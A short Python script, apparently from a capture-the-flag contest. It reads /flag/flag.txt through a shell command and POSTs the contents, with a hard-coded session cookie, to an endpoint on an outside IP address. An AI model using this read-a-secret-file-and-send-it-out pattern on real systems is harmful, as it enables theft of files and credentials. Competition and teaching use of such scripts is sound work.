import requests
import os

stream = os.popen('cat /flag/flag.txt')
flag = stream.read()


cookies = {
    'session': 'eyJ0ZWFtX2lkeCI6M30.Y8CfFQ.3YgypOYrvps_LOYyfyPoj6J9kSs',
}

headers = {
    'Accept': '*/*',
    'Accept-Language': 'ko,en-US;q=0.9,en;q=0.8',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': 'session=eyJ0ZWFtX2lkeCI6M30.Y8CfFQ.3YgypOYrvps_LOYyfyPoj6J9kSs',
    'DNT': '1',
    'Origin': 'http://3.38.255.21',
    'Referer': 'http://3.38.255.21/',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
}

data = {
    'flag': flag,
}

response = requests.post('http://3.38.255.21/api/auth', cookies=cookies, headers=headers, data=data, verify=False)